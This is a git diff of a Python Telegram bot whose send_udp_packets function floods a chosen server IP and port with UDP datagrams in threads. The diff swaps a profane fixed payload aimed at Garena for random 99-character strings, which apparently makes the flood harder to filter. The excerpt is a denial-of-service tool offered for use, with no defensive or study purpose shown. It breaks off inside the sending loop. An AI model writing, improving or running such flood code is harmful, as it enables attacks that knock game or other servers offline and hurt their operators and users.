@@ -2,12 +2,16 @@ from telegram import Update
 from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
 import socket
 import threading
+import random
+import string
 
 active_threads = []
 
 def send_udp_packets(server_ip, server_port, thread_event):
     udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    message = "fuck_garena" * 99
+    random_text_number = ''.join(random.choices(string.ascii_letters + string.digits, k=99))
+    #message = "fuck_garena" * 99
+    message = random_text_number
 
     try:
         while not thread_event.is_set():
